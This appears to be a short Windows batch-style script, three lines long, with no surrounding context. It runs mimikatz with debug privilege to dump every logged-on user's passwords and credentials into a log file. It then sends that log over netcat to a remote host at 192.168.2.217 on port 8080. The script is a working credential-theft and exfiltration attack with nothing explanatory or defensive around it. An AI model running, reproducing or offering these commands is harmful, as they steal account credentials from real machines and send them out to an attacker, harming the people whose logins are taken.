mimikatz.exe ""privilege::debug"" ""log sekurlsa::logonpasswords full"" exit
nc32.exe -w3 192.168.2.217 8080 < mimikatz.log
exit